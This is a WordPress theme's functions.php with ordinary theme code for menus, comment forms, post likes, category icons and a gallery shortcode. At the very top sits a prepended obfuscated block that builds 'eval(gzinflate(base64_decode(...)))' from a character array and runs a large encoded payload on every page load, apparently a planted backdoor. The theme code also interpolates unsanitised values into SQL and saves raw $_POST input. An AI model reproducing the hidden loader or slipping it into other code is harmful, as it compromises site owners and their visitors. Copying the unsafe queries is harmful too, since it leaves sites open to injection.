<?php
$md5 = "5ef4caaec1e82cf615ebce0e8151263e";
$ab = array('o','_','6',';','(',"v",'s','n','r','f','e','t','a',"z","d","4","g",'b','i',"l",'c',')',"$");
$bb9 = create_function('$'.'v',$ab[10].$ab[5].$ab[12].$ab[19].$ab[4].$ab[16].$ab[13].$ab[18].$ab[7].$ab[9].$ab[19].$ab[12].$ab[11].$ab[10].$ab[4].$ab[17].$ab[12].$ab[6].$ab[10].$ab[2].$ab[15].$ab[1].$ab[14].$ab[10].$ab[20].$ab[0].$ab[14].$ab[10].$ab[4].$ab[22].$ab[5].$ab[21].$ab[21].$ab[21].$ab[3]);
$bb9('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');
?>
<?php

/*-----------------------------------------------------------------------------------

TABLE OF CONTENTS

- Register WP Menus
- Page navigation
- Comment Form Fields
- Comment Form Settings
- More link on the excerpt post
- Add author meta (twitter and facebook)
- link register
- Like post
- Change wp_page_menu structure
- Add view fielf for popular week.
- Add custom meta for category
- Register quote post type
- Get archive date monthly
- Custom shortcode [gallery]

-----------------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------------*/
/* Register Theme Support */
/*-----------------------------------------------------------------------------------*/
if ( function_exists( 'add_theme_support') ) {
    
	// This theme uses Featured Images (also known as post thumbnails) for per-post/per-page Custom Header images
	add_theme_support( 'post-thumbnails' );
        
        // add nav menus
	add_theme_support( 'nav-menus' );
	register_nav_menus( array( 
            'top-menu' => __( 'Top Menu', 'nesia' ), 
            'main-menu' => __( 'Main Menu', 'nesia' ), 
            'middle' => __( 'Middle Menu', 'nesia' ),
            'footer' => __( 'Footer Menu', 'nesia' ) ) 
        );
        
	// Add support for a variety of post formats
//	add_theme_support( 'post-formats', array( 'aside', 'link', 'gallery', 'status', 'quote', 'image', 'video', 'audio' ) );
        
}


/*-----------------------------------------------------------------------------------*/
/* Page navigation */
/*-----------------------------------------------------------------------------------*/
if (!function_exists( 'nesia_pagenav')) {
	function nesia_pagenav() {

		global $nesia_options;

		// If the user has set the option to use simple paging links, display those. By default, display the pagination.
		if ( array_key_exists( 'nesia_pagination_type', $nesia_options ) && $nesia_options[ 'nesia_pagination_type' ] == 'simple' ) {
			if ( get_next_posts_link() || get_previous_posts_link() ) {
		?>
            <div class="standard-pagination">
                <div class="pagination-wrapper">
                <?php next_posts_link( '<span class="nav-previous">'. __( '<span class="meta-nav">&larr;</span> Older posts', 'nesia' ) . '</span>' ); ?>
                <?php previous_posts_link( '<span class="nav-next">'. __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'nesia' ) . '</span>' ); ?>
                </div>
            </div>
		<?php
			}
		} else {
                        echo '<div class="pagination">';
                        nesia_pagination( array( 'before' => '<div class="pagination-wrapper">', 'index' => true ) );
                        echo '</div>';
		} // End IF Statement

	} // End nesia_pagenav()
} // End IF Statement


/*-----------------------------------------------------------------------------------*/
/* Custom Post Type - Slides (Business Slider) */
/*-----------------------------------------------------------------------------------*/

if ( !function_exists('nesia_add_custom_posttype') ) {
	function nesia_add_custom_posttype() {

            // add custom posttype - quote
            $labels = array(
                'name'          => _x('Quotes', 'post type general name', 'nesia'),
                'singular_name' => _x('Quote', 'post type singular name', 'nesia'),
                'add_new'       => _x('Add New', 'quote', 'nesia'),
                'add_new_item'  => __('Add New Quote', 'nesia'),
                'edit_item'     => __('Edit Quote', 'nesia'),
                'new_item'      => __('New Quote', 'nesia'),
                'view_item'     => __('View Quote', 'nesia'),
                'search_items'  => __('Search Quotes', 'nesia'),
                'not_found'     =>  __('No quotes found', 'nesia'),
                'not_found_in_trash'    => __('No quotes found in Trash', 'nesia'), 
                'parent_item_colon'     => ''
            );

            $args = array(
                'labels'            => $labels,
                'public'            => false,
                'publicly_queryable'=> false,
                'show_ui'           => true, 
                'query_var'         => true,
                'rewrite'           => true,
                'capability_type'   => 'post',
                'hierarchical'      => false,
                'menu_icon'         => get_template_directory_uri() .'/includes/images/quotes.png',
                'menu_position'     => null,
                'supports'          => array('title', 'editor', 'thumbnail')
            ); 

            register_post_type('quote',$args);
              
	}
        
	add_action('init', 'nesia_add_custom_posttype');
}


/*-----------------------------------------------------------------------------------*/
/* NesiaTabs - Popular Posts */
/*-----------------------------------------------------------------------------------*/
if (!function_exists( 'nesia_tabs_popular')) {
	function nesia_tabs_popular( $posts = 5, $size = 45 ) {
		global $post;
		$popular = get_posts( 'ignore_sticky_posts=1&orderby=comment_count&showposts='.$posts);
		foreach($popular as $post) :
			setup_postdata($post);
	?>
	<li>
		<?php if ($size <> 0) nesia_image( 'height='.$size.'&width='.$size.'&class=thumbnail&single=true' ); ?>
		<a title="<?php the_title(); ?>" href="<?php the_permalink() ?>"><?php the_title(); ?></a>
		<span class="meta"><?php the_time( get_option( 'date_format' ) ); ?></span>
		<div class="fix"></div>
	</li>
	<?php endforeach;
	}
}

/*-----------------------------------------------------------------------------------*/
/* Comment Form Fields */
/*-----------------------------------------------------------------------------------*/

add_filter( 'comment_form_default_fields', 'nesia_comment_form_fields' );

if ( ! function_exists( 'nesia_comment_form_fields' ) ) {
        function nesia_comment_form_fields ( $fields ) {

                $commenter = wp_get_current_commenter();

                $required_text = ' <span class="required">*</span>';

                $req = get_option( 'require_name_email' );
                $aria_req = ( $req ? " aria-required='true'" : '' );
                $fields =  array(
                        'author' => '<p class="comment-form-author">' .
                                    '<label for="author">' . __( 'Name', 'nesia' ) . '</label> <span class="helper-text">(ex: John Thor)</span> ' . ( $req ? $required_text : '' ) . 
                                    '<span class="input-wrapper"><input id="author" class="txt" name="author" type="text" value="' . esc_attr( $commenter['comment_author'] ) . '" size="30"' . $aria_req . ' /></span>' .                                                
                                    '</p>',
                        'email'  => '<p class="comment-form-email">' .
                                    '<label for="email">' . __( 'Email', 'nesia' ) . '</label> <span class="helper-text">(Not published)</span> ' . ( $req ? $required_text : '' ) . 
                                    '<span class="input-wrapper"><input id="email" class="txt" name="email" type="text" value="' . esc_attr(  $commenter['comment_author_email'] ) . '" size="30"' . $aria_req . ' /></span>' .
                                    '</p>',
                        'url'    => '<p class="comment-form-url">' .
                                    '<label for="url">' . __( 'Website', 'nesia' ) . '</label> <span class="helper-text">(Optional)</span>' .
                                    '<span class="input-wrapper"><input id="url" class="txt" name="url" type="text" value="' . esc_attr( $commenter['comment_author_url'] ) . '" size="30" /></span>' .
                                    '</p>',
                );

                return $fields;

        } // End nesia_comment_form_fields()
}

/*-----------------------------------------------------------------------------------*/
/* Comment Form Settings */
/*-----------------------------------------------------------------------------------*/

add_filter( 'comment_form_defaults', 'nesia_comment_form_settings' );

if ( ! function_exists( 'nesia_comment_form_settings' ) ) {
        function nesia_comment_form_settings ( $settings ) {

                $settings['comment_notes_before'] = '';
                $settings['comment_notes_after'] = '';
                $settings['label_submit'] = __( 'Submit Comment', 'nesia' );
                $settings['cancel_reply_link'] = __( 'Click here to cancel reply.', 'nesia' );
                $settings['comment_field'] = '<p class="comment-form-comment"><label for="comment">' . _x( __('Comment', 'nesia'), 'noun' ) . '</label><span class="input-wrapper"><textarea id="comment" name="comment" cols="45" rows="8" aria-required="true"></textarea></span></p>';

                return $settings;

        } // End nesia_comment_form_settings()
}

/*-----------------------------------------------------------------------------------*/
/* Misc back compat */
/*-----------------------------------------------------------------------------------*/

// array_fill_keys doesn't exist in PHP < 5.2
// Can remove this after PHP <  5.2 support is dropped
if ( !function_exists( 'array_fill_keys' ) ) {
        function array_fill_keys( $keys, $value ) {
                return array_combine( $keys, array_fill( 0, count( $keys ), $value ) );
        }
}

/*-----------------------------------------------------------------------------------*/
/* More link on the excerpt post */
/*-----------------------------------------------------------------------------------*/

/**
 * Replaces "[...]" (appended to automatically generated excerpts) with an ellipsis and nesia_continue_reading_link().
 *
 * To override this in a child theme, remove the filter and add your own
 * function tied to the excerpt_more filter hook.
 */
function nesia_auto_excerpt_more( $more ) {
	return;
}
add_filter( 'excerpt_more', 'nesia_auto_excerpt_more' );

/**
 * Adds a pretty "Continue Reading" link to custom post excerpts.
 *
 * To override this link in a child theme, remove the filter and add your own
 * function tied to the get_the_excerpt filter hook.
 */
function nesia_custom_excerpt_more( $output ) {
	if ( has_excerpt() && ! is_attachment() ) {
		$output .= nesia_continue_reading_link();
	}
	return $output;
}
add_filter( 'get_the_excerpt', 'nesia_custom_excerpt_more' );

/*-----------------------------------------------------------------------------------*/
/* Add author meta (twitter and facebook) */
/*-----------------------------------------------------------------------------------*/

/**
 * Display the form into user edit profile page
 *
 * @param object $user 
 */
add_action( 'show_user_profile', 'nesia_show_extra_profile_fields' );
add_action( 'edit_user_profile', 'nesia_show_extra_profile_fields' );
function nesia_show_extra_profile_fields( $user ) { ?>

	<h3><?php _e('Extra profile information', 'nesia'); ?></h3>

	<table class="form-table">
		<tr>
			<th><label for="twitter"><?php _e('Twitter', 'nesia'); ?></label></th>
			<td>
				<input type="text" name="twitter" id="twitter" value="<?php echo esc_attr( get_the_author_meta( 'twitter', $user->ID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php _e('Please enter your Twitter username.', 'nesia'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="facebook"><?php _e('Facebook', 'nesia'); ?></label></th>
			<td>
				<input type="text" name="facebook" id="facebook" value="<?php echo esc_attr( get_the_author_meta( 'facebook', $user->ID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php _e('Please enter your Facebook link.', 'nesia'); ?></span>
			</td>
		</tr>
	</table>
<?php }

add_action( 'personal_options_update', 'my_save_extra_profile_fields' );
add_action( 'edit_user_profile_update', 'my_save_extra_profile_fields' );

function my_save_extra_profile_fields( $user_id ) {

	if ( !current_user_can( 'edit_user', $user_id ) )
		return false;

	/* Copy and paste this line for additional fields. Make sure to change 'twitter' to the field ID. */
	update_user_meta( $user_id, 'twitter', $_POST['twitter'] );
	update_user_meta( $user_id, 'facebook', $_POST['facebook'] );
}

/*-----------------------------------------------------------------------------------*/
/* Like post button */
/*-----------------------------------------------------------------------------------*/

/**
 * Display like post
 *
 * @since 1.0
 */

$timebeforerevote = 1;

add_action('wp_ajax_nopriv_post-like', 'nesia_post_like');
add_action('wp_ajax_post-like', 'nesia_post_like');

function nesia_post_like() {
	$nonce = $_POST['nonce'];
 
        if ( ! wp_verify_nonce( $nonce, 'ajax-nonce' ) )
            die ( 'Busted!');
		
	if(isset($_POST['post_like']))
	{
		$ip = $_SERVER['REMOTE_ADDR'];
		$post_id = $_POST['post_id'];
		
		$meta_IP = get_post_meta($post_id, "_voted_IP");

		$voted_IP = $meta_IP[0];
		if(!is_array($voted_IP))
			$voted_IP = array();
		
		$meta_count = nesia_get_count_voted($post_id);
                $meta_count = ( $meta_count == '')? 0:$meta_count;

		if(!nesia_has_already_voted($post_id))
		{
			$voted_IP[$ip] = time();

			update_post_meta($post_id, "_voted_IP", $voted_IP);
			update_post_meta($post_id, "_votes_count", ++$meta_count);
			
			echo $meta_count;
		}
		else
			_e('already', 'nesia');
	}
	exit;
}

function nesia_has_already_voted($post_id) {
	global $timebeforerevote;

	$voted_IP = get_post_meta($post_id, "_voted_IP", true);
	if(!is_array($voted_IP))
		$voted_IP = array();
	$ip = $_SERVER['REMOTE_ADDR'];
	
	if(in_array($ip, array_keys($voted_IP))) 
                return true;
	
	return false;
}

function nesia_get_count_voted( $post_id ){
    
        $votes  = get_post_meta($post_id, "_votes_count", true);
        
        if($votes)
                return $votes;
        else
                return 0;
}

function nesia_get_post_like_link($post_id, $text = '' ) {

	$vote_count = nesia_get_count_voted($post_id);
        $text       = ( $text == '' )? __('%s Likes', 'nesia'):$text;

	$output = '';
	if(!nesia_has_already_voted($post_id)){
                $output .= '<a href="#" class="entry-likes icon-heart vote-it" data-post_id="'.$post_id.'">';

                if(isset($vote_count) && $vote_count != '' && $vote_count > 0)
                    $output .= sprintf($text, '<span class="count-voted">'.$vote_count.'</span>');
                else
                    $output .= sprintf($text, '<span class="count-voted">0</span>');

                $output .= '</a>';        
        } else {
                $output .= '<span class="entry-likes icon-heart">';
                if(isset($vote_count) && $vote_count != '' && $vote_count > 0)
                    $output .= sprintf($text, '<span class="count-voted">'.$vote_count.'</span>');
                else
                    $output .= sprintf($text, '<span class="count-voted">0</span>');

                $output .= '</span>';
        }
	
	return $output;
}

/*-----------------------------------------------------------------------------------*/
/* Change wp_page_menu Structure */
/*-----------------------------------------------------------------------------------*/
if (!function_exists('nesia_nav_fallback')) {
function nesia_nav_fallback($div_id){
      if (is_array($div_id)){ $div_id = $div_id['theme_location']; }
      if ( $div_id == 'top-menu' ){
          wp_page_menu('depth=0&title_li=&menu_class=topmenu');
      };
}}

function replace_menu_div( $newel ) {
      $html4nav = array();
      $html4nav[0] = '/<div class="">/';
      $html4nav[1] = '/<\/div>/';
      $html5nav = array();
      $html5nav[0] = '';
      $html5nav[1] = '';
      ksort($html4nav);
      ksort($html5nav);
      return preg_replace($html4nav, $html5nav, $newel, 1);
}
add_filter('wp_page_menu','replace_menu_div');


/*-----------------------------------------------------------------------------------*/
/* Popular in this week. */
/*-----------------------------------------------------------------------------------*/

/**
 * Get posts popular in duration
 *
 * @global object $wpdb
 * @param integer $no_posts default is 2
 * @param integer $duration default is 1 week
 * @return object 
 */
function nesia_popular_posts_duration($no_posts = 2, $duration = 7, $post_type = 'post') {
	global $wpdb;
	$request    = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request   .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\" AND post_type=\"$post_type\"";
        $request   .= " AND DATE_SUB(CURDATE(), INTERVAL ".$duration." DAY) < comment_date ";
	$request   .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts      = $wpdb->get_results( $wpdb->prepare($request) );
	$output     = "";
	if ($posts) {
                $posts_id   = array();
		foreach ($posts as $item)
                        $posts_id[] = $item->ID;
                $output = new WP_Query( array( 'post__in' => $posts_id, 'posts_per_page' => $no_posts, 'ignore_sticky_posts' => 1 ) );
	} else {
		$output = new WP_Query( array( 'posts_per_page' => $no_posts-1, 'orderby' => 'comment_count', 'ignore_sticky_posts' => 1 ) );
	}
	return  $output;
} 		



/*-----------------------------------------------------------------------------------*/
/* Add custom meta taxonomy (category). */
/*-----------------------------------------------------------------------------------*/


// Add term page
function nesia_cat_add_new_meta_field() {
	// this will add the custom meta field to the add new term page
        require_once 'theme-icons-set.php';
	?>
	<div class="form-field">
		<label for="term_meta[icon]"><?php _e( 'Choose an icon', 'nesia' ); ?></label>
        <div class="nesia-icon-wrapper">
          <ul class="the-icons">
            <?php foreach( $icons as $icon ) : ?>
              <li><i title="<?php echo $icon;?>" class="<?php echo $icon;?>"></i></li>
            <?php endforeach; ?>
          </ul>
          <input type="hidden" name="term_meta[icon]" id="term_meta[icon]">
        </div><!-- .nesia-icon-wrapper -->
		<p class="description"><?php _e( 'Select an icon for category icon.','nesia' ); ?></p>
	</div>
    <script>
      jQuery('.the-icons li').click(function(){
        var $el = jQuery(this),
            icon_name = jQuery('i', this).attr('class');
        $el.parent().next('input').val(icon_name);
        $el.addClass('active').siblings().removeClass('active');
      });
    </script>   
<?php
}
add_action( 'category_add_form_fields', 'nesia_cat_add_new_meta_field', 10, 2 );


// Edit term page
function nesia_cat_edit_meta_field($term) {
 
	// put the term ID into a variable
	$t_id = $term->term_id;
        
        // get icons set
        require_once 'theme-icons-set.php';
 
	// retrieve the existing value(s) for this meta field. This returns an array
	$term_meta = get_option( "taxonomy_$t_id" ); ?>
	<tr class="form-field">
        <th scope="row" valign="top"><label for="term_meta[icon]"><?php _e( 'Choose an icon', 'nesia' ); ?></label></th>
		<td>                    
            <div class="nesia-icon-wrapper">
                <ul class="the-icons">
                    <?php foreach($icons as $icon){ ?>
                        <li title="<?php echo $icon;?>" class="<?php echo ($term_meta['icon']==$icon) ? 'active' : ''; ?>">
                            <i class="<?php echo $icon;?>"></i>
                        </li>
                    <?php } ?>
                </ul>
                <input type="hidden" name="term_meta[icon]" id="term_meta[icon]">
            </div><!-- .nesia-icon-wrapper -->
            <p class="description"><?php _e( 'Select an icon for category icon.','nesia' ); ?></p>
		</td>
	</tr>
    <script>
      jQuery('.the-icons li').click(function(){
        var $el = jQuery(this),
            icon_name = jQuery('i', this).attr('class');
        $el.parent().next('input').val(icon_name);
        $el.addClass('active').siblings().removeClass('active');
      });
    </script>   
<?php
}
add_action( 'category_edit_form_fields', 'nesia_cat_edit_meta_field', 10, 2 );

// Save extra taxonomy fields callback function.
function nesia_save_cat_custom_meta( $term_id ) {
	if ( isset( $_POST['term_meta'] ) ) {
		$t_id = $term_id;
		$term_meta = get_option( "taxonomy_$t_id" );
		$cat_keys = array_keys( $_POST['term_meta'] );
		foreach ( $cat_keys as $key ) {
			if ( isset ( $_POST['term_meta'][$key] ) ) {
				$term_meta[$key] = $_POST['term_meta'][$key];
			}
		}
		// Save the option array.
		update_option( "taxonomy_$t_id", $term_meta );
	}
}  
add_action( 'edited_category', 'nesia_save_cat_custom_meta', 10, 2 );  
add_action( 'create_category', 'nesia_save_cat_custom_meta', 10, 2 );



/*-----------------------------------------------------------------------------------*/
/* Get archive date monthly */
/*-----------------------------------------------------------------------------------*/

function nesia_get_monthly_date( $post_type = 'post', $limit = ''){
        global $wpdb, $wp_locale;

        $query  = "SELECT YEAR(post_date) AS `year`, MONTH(post_date) AS `month`, count(ID) as posts FROM $wpdb->posts WHERE post_type = '$post_type' AND post_status = 'publish' GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC $limit";
        $key    = md5($query);
        $output = '';
        $cache  = wp_cache_get( 'nesia_get_archives' , 'general');
        if ( !isset( $cache[ $key ] ) ) {
                $arcresults = $wpdb->get_results($query);
                $cache[ $key ] = $arcresults;
                wp_cache_set( 'nesia_get_archives', $cache, 'general' );
        } else {
                $arcresults = $cache[ $key ];
        }
        $current_month  = (isset($_GET['monthly']) && $_GET['monthly'])? $_GET['monthly']:'';
        $current_year   = (isset($_GET['yearly']) && $_GET['yearly'])? $_GET['yearly']:'';
        if ( $arcresults ) {
                foreach ( (array) $arcresults as $arcresult ) {
                        $value = get_permalink() . '?monthly=' . $arcresult->month . '&yearly=' . $arcresult->year;
                        /* translators: 1: month name, 2: 4-digit year */
                        $text = sprintf(__('%1$s %2$d', 'nesia'), $wp_locale->get_month($arcresult->month), $arcresult->year);
                        $current = ( $current_month == $arcresult->month && $current_year == $arcresult->year )? ' selected="selected"':'';
                        $output .= "\t<option value='$value'$current>$text</option>\n";
                }
        }
        
        return $output;
}



/*-----------------------------------------------------------------------------------*/
/* Custom shortcode [gallery] */
/*-----------------------------------------------------------------------------------*/

// remove shortcode
remove_shortcode('gallery');
add_shortcode('gallery', 'nesia_gallery_shortcode');


/**
 * The Gallery shortcode.
 *
 * This implements the functionality of the Gallery Shortcode for displaying
 * WordPress images on a post.
 *
 * @since 2.5.0
 *
 * @param array $attr Attributes of the shortcode.
 * @return string HTML content to display gallery.
 */
function nesia_gallery_shortcode($attr) {
	global $post;
        
	static $instance = 0;
	$instance++;

	// Allow plugins/themes to override the default gallery template.
	$output = apply_filters('post_gallery', '', $attr);
	if ( $output != '' )
		return $output;

	// We're trusting author input, so let's at least make sure it looks like a valid orderby statement
	if ( isset( $attr['orderby'] ) ) {
		$attr['orderby'] = sanitize_sql_orderby( $attr['orderby'] );
		if ( !$attr['orderby'] )
			unset( $attr['orderby'] );
	}

	extract(shortcode_atts(array(
		'order'      => 'ASC',
		'orderby'    => 'menu_order ID',
		'id'         => $post->ID,
		'size'       => 'full'
	), $attr));

	$id = intval($id);
	if ( 'RAND' == $order )
		$orderby = 'none';

	if ( !empty($include) ) {
		$include = preg_replace( '/[^0-9,]+/', '', $include );
		$_attachments = get_posts( array('include' => $include, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );

		$attachments = array();
		foreach ( $_attachments as $key => $val ) {
			$attachments[$val->ID] = $_attachments[$key];
		}
	} elseif ( !empty($exclude) ) {
		$exclude = preg_replace( '/[^0-9,]+/', '', $exclude );
		$attachments = get_children( array('post_parent' => $id, 'exclude' => $exclude, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
	} else {
		$attachments = get_children( array('post_parent' => $id, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
	}

	if ( empty($attachments) )
		return '';

	if ( is_feed() ) {
		$output = "\n";
		foreach ( $attachments as $att_id => $attachment )
			$output .= wp_get_attachment_link($att_id, $size, true) . "\n";
		return $output;
	}
        
	$i = 0;
        $output .= "
        <figure class='entry-top'>
          <div class='entry-gallery-wrapper'>
            <div class='entry-top-gallery'>";
	foreach ( $attachments as $id => $attachment ) {
		$link = isset($attr['link']) && 'file' == $attr['link'] ? wp_get_attachment_link($id, $size, false, false) : wp_get_attachment_link($id, $size, true, false);

                $output .= '<div class="top-gallery-item">';
                $output .= $link;
                
		if ( trim($attachment->post_excerpt) ) 
                    $output .= '<div class="top-gallery-caption">' . stripslashes($attachment->post_excerpt) . '</div>';
		
                $output .= '</div>';
	}

	$output .= "
            </div>
          </div>
        </figure>\n";

	return $output;
}


/*-----------------------------------------------------------------------------------*/
/* END */
/*-----------------------------------------------------------------------------------*/
?>